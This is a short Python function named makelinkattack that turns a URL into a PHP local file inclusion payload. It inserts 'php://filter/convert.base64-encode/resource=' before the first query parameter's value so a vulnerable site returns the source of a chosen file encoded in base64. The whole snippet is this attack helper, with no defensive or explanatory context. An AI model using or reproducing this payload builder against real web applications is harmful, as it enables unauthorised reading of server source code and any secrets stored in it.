def makelinkattack(url):
    vitri = url.find("=")+1
    a = url[0:vitri]
    b = url[vitri:]
    c = a+"php://filter/convert.base64-encode/resource="+b
    return c
